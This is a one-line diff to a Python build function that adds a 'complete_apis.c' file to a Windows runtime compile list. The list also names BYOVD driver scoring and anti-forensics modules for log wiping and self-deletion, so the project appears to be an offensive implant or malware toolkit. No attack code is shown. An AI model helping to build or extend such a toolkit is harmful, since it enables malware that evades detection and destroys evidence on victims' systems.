@@ -526,6 +526,7 @@ def stage_compile_runtime(build_dir, platform="windows"):
         RUNTIME_DIR / "byovd" / "driver_scoring.c",  # Driver intelligence scoring
         WIN / "registry" / "registry.c",
         WIN / "audit" / "audit.c",
+        WIN / "apis" / "complete_apis.c",
         WIN / "anti_forensics" / "forensics.c",
         WIN / "anti_forensics" / "logs.c",
         WIN / "anti_forensics" / "self_delete.c",
